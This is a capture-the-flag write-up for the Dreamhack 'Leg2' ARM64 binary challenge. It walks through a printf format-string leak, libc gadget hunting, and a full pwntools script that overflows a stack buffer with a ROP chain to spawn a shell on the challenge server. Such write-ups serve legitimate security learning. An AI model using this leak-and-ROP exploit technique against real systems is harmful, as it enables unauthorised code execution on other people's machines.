+++
date = '2026-05-21'
draft = false
title = 'Dreamhack Leg2 Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
드림이는 ARM 의 세계에 첫 발을 내밀었어요!


---

I really don't mind arm challenges, but this one truly was horrible, and it took me multiple hours.

```c

void vuln(void)

{
  undefined1 auStack_100 [256];
  
  printf("your name > ");
  read_input(&name_pointer,0x20);
  printf("Hi! ");
  printf(&name_pointer);
  putchar(10);
  printf("Let me know your message!");
  printf("\n> ");
  read_input(auStack_100,0x200);
  return;
}
```

## Identifying the vulnerabilities

The vulnerability is simple, a clear buffer overflow, with a printf format string vulnerability as well.

To run this, we are given a `run.sh` file that I modified a little:

```bash
#!/bin/sh
PORT=8000
FLAG="DH{this_is_a_flag}"
qemu-system-aarch64 -M virt -cpu cortex-a57 -m 128 -kernel kernel -initrd rootfs -nographic -serial mon:stdio -append "console=ttyAMA0 FLAG=\"$FLAG\"" -netdev user,id=n1,hostfwd=tcp::$PORT-:8000,hostfwd=tcp::1234-:1234 -device virtio-net-pci,netdev=n1
```

I added the `hostfwd=tcp::1234-:1234` for remote pwntools debugging.

Running the script will spawn a qemu arm machine where we can login by specifying the user `root`. What I did in order to debug (this might've been overcomplicated, but it's all found that worked):

- `p = remote(ip, port)` with localhost 8000

- add a `pause()` in the exploit before anything else

- catch the process pid in the vm with `ps`

- in the vm, `gdbserver --attach 0.0.0.0:1234 pid`

- in my main machine, `gdb-multiarch ./chal -ex "target remote :1234"`


The first thing I did was gather all the necessary leaks.

```python
p.recvuntil(b"> ")
p.sendline(b"%p.%p.%p.%p.%p.%p.%p")
p.recvuntil(b"Hi! ")

data = p.recvline().strip()
stack_leak, b, libc_leak, d, e, f, leak = data.split(b'.')

leak = int(leak, 16)
libc_leak = int(libc_leak, 16)
stack_leak = int(stack_leak, 16)

base = leak - 0xc90
libc_addr = libc_leak - 0x46f4c

system = libc_addr + 0x3e9b4
execve = libc_addr + 0x3de4c
```

I didn't find any gadgets in the ELF itself, so I proceeded with what I found in the `libc.so`.

To find it, I identified that the `rootfs` we got was a cpio archive, I unzipped it with `gunzip -c ../rootfs | cpio -idmv`. Then, inside the `lib` folder we can access the `libc.so`.

Now here came the horrible, horrible part. I noticed that our register `x1` contained a pointer to the beginning of our input on the stack, which we could start off with "/bin/sh". I found a `mov x0, x1` gadget, and set the `x30` to `system`. Stepping into each instruction, a shell seemed to be getting popped successfully, but it kept responding with `-sh unrecognized [bytes]`, where bytes seemed to always be the input stack address - 0x10. Then, it stopped responding to our input altogether.

I spent hours debugging this. I even tried to replace it with `execve`, found some ridiculous gadgets to null out `x1` and `x2`, but I seemed to be getting this same strange error.

Manually searching with `search "/bin/sh"` in pwndbg came with no results from libc, so I didn't think to use the libc binsh until just now, a day after I started this challenge.

The working payload looked like this:

```python
libc.address = libc_addr
binsh = next(libc.search(b"/bin/sh\x00"))

payload = (b"/bin/sh\x00" +
           p64(0x0) +
           b"A"*(256-8-8) +  #auStack_100
           b"B"*8 + #x29
           p64(ldr_x0_sp18_ldp_x19_x30) + #SP HERE
           p64(0x19) + #x19
           p64(system) +
           p64(0xdeadbeef) +
           p64(binsh)
           )
```

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/leg2/chal')
libc = ELF('/home/kali/Downloads/dreamhack/leg2/rootfs_extracted/lib/libc.so')

cyberedu = 'host3.dreamhack.games:17482'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#pause()

#buildroot login: root
#chal

print(elf.got)
#seems like classic ret2libv but make it aarch
#avem fmtstr vuln

p.recvuntil(b"> ")
p.sendline(b"%p.%p.%p.%p.%p.%p.%p")
p.recvuntil(b"Hi! ")

data = p.recvline().strip()
stack_leak, b, libc_leak, d, e, f, leak = data.split(b'.')

leak = int(leak, 16)
libc_leak = int(libc_leak, 16)
stack_leak = int(stack_leak, 16)

base = leak - 0xc90
libc_addr = libc_leak - 0x46f4c
system = libc_addr + 0x3e9b4
execve = libc_addr + 0x3de4c

#vuln = base + 0x0100bd0
print(f"base is {hex(base)}")
print(f"libc is {hex(libc_addr)}")
print(f"stack_leak is {hex(stack_leak)}")
#no binsh, no problem. scriem noi in payload + stack leak.
#x0 is null at za moment 
#si x1 e exact inceputul inputului
#wait poate avem gadgets in libc(?)

stack_binsh = stack_leak + 0x1c0
print(f"on the stack, binsh is at {hex(stack_binsh)}")
p.recvuntil(b"> ")

#0x000000000001ae30: mov x0, x1; ldp x19, x30, [sp], #0x10; ret; 
#X0 <- X1
mov_x0_x1_ldp_x19_x30 = libc_addr + 0x1ae30

#0x000000000003cae8: ldr x0, [sp, #0x18]; ldp x19, x30, [sp], #0x20; ret;
#X0 <- SP+0x18
ldr_x0_sp18_ldp_x19_x30 = libc_addr + 0x3cae8

libc.address = libc_addr
binsh = next(libc.search(b"/bin/sh\x00"))

payload = (b"/bin/sh\x00" +
           p64(0x0) +
           b"A"*(256-8-8) +  #auStack_100
           b"B"*8 + #x29
           p64(ldr_x0_sp18_ldp_x19_x30) + #SP HERE
           p64(0x19) + #x19
           p64(system) +
           p64(0xdeadbeef) +
           p64(binsh)
           )
           
#in x1 nu ajunge ce trebuie - ceva ce contine un alt pointer catre stack.
#ok      
#always ajunge sa faca sh de addr_stack_binsh - 10.
#am schimbat in libc.search si o mers

p.send(payload)
p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/leg2.py)**.
